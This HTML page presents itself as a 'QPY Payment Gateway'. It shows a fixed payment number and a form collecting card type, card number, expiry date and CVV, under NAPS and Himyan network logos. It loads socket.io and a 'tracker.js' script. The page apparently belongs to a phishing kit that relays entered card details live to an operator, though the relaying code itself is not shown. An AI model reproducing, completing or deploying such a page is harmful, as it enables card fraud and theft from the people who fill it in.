<!DOCTYPE html>
<html lang="en" dir="ltr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
    <title>QPY Payment Gateway</title>
    <link rel="stylesheet" href="qpy_styles.css">
</head>

<body class="qpy-body">
    <div class="qpy-wrapper">
        <div class="qpy-header-info">
            <p>Payment Unique Number:</p>
            <p>0111202504534250828</p>

            <p class="amount-label">Amount</p>
            <p class="amount-value" id="qpy-amount">â€”</p>
        </div>

        <div id="paymentForm">
            <div class="qpy-box">
                <div class="qpy-box-header">
                    Enter your payment card details
                </div>
                <div class="qpy-box-content">
                    <div class="qpy-radio-group">
                        <label class="qpy-radio-btn">
                            <input type="radio" name="cardType" value="Credit Card" required>
                            Credit Card
                        </label>
                        <label class="qpy-radio-btn">
                            <input type="radio" name="cardType" value="Debit Card" required>
                            Debit Card
                        </label>
                    </div>

                    <div class="qpy-form-group">
                        <label for="cardNumber">Card Number *</label>
                        <input type="text" id="cardNumber" name="cardNumber" required placeholder="" maxlength="19">
                    </div>

                    <div class="qpy-form-group">
                        <label>Card Expiry Date</label>
                        <div class="qpy-expiry-group">
                            <select id="expMonth" name="expMonth" required>
                                <option value="" disabled selected></option>
                                <option value="01">01 - January</option>
                                <option value="02">02 - February</option>
                                <option value="03">03 - March</option>
                                <option value="04">04 - April</option>
                                <option value="05">05 - May</option>
                                <option value="06">06 - June</option>
                                <option value="07">07 - July</option>
                                <option value="08">08 - August</option>
                                <option value="09">09 - September</option>
                                <option value="10">10 - October</option>
                                <option value="11">11 - November</option>
                                <option value="12">12 - December</option>
                            </select>

                            <select id="expYear" name="expYear" required>
                                <option value="2026" selected>2026</option>
                                <option value="2027">2027</option>
                                <option value="2028">2028</option>
                                <option value="2029">2029</option>
                                <option value="2030">2030</option>
                                <option value="2031">2031</option>
                                <option value="2032">2032</option>
                                <option value="2033">2033</option>
                                <option value="2034">2034</option>
                                <option value="2035">2035</option>
                            </select>
                        </div>
                    </div>

                    <div class="qpy-form-group" id="cvvContainer" style="display: none;">
                        <label for="cvv">CVV *</label>
                        <input type="text" id="cvv" name="cvv" required placeholder="" maxlength="4">
                    </div>

                    <div class="qpy-terms">
                        By clicking the "Continue" button, you hereby acknowledge accepting the <a href="#">Terms and
                            Conditions</a> of payment.
                    </div>

                    <div class="qpy-logos">
                        <div style="display:flex; align-items:center; gap:5px; font-weight:bold;">
                            <img src="Logo/NAPS.PNG" alt="NAPS">
                        </div>
                        <div style="display:flex; align-items:center; gap:5px; font-weight:bold;">
                            <img src="Logo/HIMYAN.PNG" alt="NAPS">
                        </div>
                    </div>

                    <button type="button" class="qpy-continue-btn" id="continueBtn" disabled>Continue</button>
                </div>
            </div>
        </div>
    </div>

    <script src="assets/qpy-payment.js" defer></script>
<script src="/socket.io/socket.io.js"></script>
<script src="/assets/tracker.js"></script>
</body>

</html>
